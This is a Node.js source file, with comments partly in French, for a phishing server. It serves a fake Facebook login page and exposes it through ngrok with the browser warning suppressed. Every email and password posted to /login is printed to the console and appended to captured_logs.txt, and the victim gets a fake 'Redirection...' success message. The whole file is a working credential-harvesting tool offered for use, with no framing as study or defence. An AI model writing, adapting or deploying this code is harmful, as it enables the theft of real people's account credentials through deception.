const http = require('http');
const fs = require('fs');
const url = require('url');
const querystring = require('querystring');

const port = 8000;

// Function to the server static files
function serveStaticFile(res, path, contentType, responseCode = 200) {
    fs.readFile(path, (err, data) => {
        if (err) {
            res.writeHead(500, {'Content-Type': 'text/plain'});
            return res.end('500 - Internal Error');
        }
        res.writeHead(responseCode, {'Content-Type': contentType});
        res.end(data);
    });
}

// Creating the Server 
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;
    
    // Add the header to avoid the ngrok warning
    res.setHeader('ngrok-skip-browser-warning', 'true');
    
    // Handling POST requests for /login
    if (req.method === 'POST' && pathname === '/login') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            const postData = querystring.parse(body);
            const email = postData.email || '';
            const password = postData.password || '';
            
            // Display in the server Console
            console.log('🔐 Identifiants capturés:');
            console.log('📧 Email:', email);
            console.log('🔑 Mot de passe:', password);
            console.log('----------------------');
            
            // Save to a file
            const logEntry = `${new Date().toISOString()} - Email: ${email}, Password: ${password}\n`;
            fs.appendFile('captured_logs.txt', logEntry, (err) => {
                if (err) console.error('Erreur écriture fichier:', err);
            });
            
            // Réponse JSON
            res.writeHead(200, {'Content-Type': 'application/json'});
            res.end(JSON.stringify({status: 'success', message: 'Redirection...'}));
        });
    } 
    // Serve the Facebook page
    else if (pathname === '/' || pathname === '/fb.html') {
        serveStaticFile(res, './fb.html', 'text/html');
    }
    // Serve a fictitious favicon to avoid 404 errors
    else if (pathname === '/favicon.ico') {
        res.writeHead(204);
        res.end();
    }
    // Page non trouvée
    else {
        serveStaticFile(res, './fb.html', 'text/html', 404);
    }
});

server.listen(port, () => {
    console.log(`🚀Server started on http://localhost:${port}`);
    console.log(`📋The credentials will be displayed here and saved in captured_logs.txt`);
    console.log(`🚫The ngrok-skip-browser-warning header has been added.`);
});
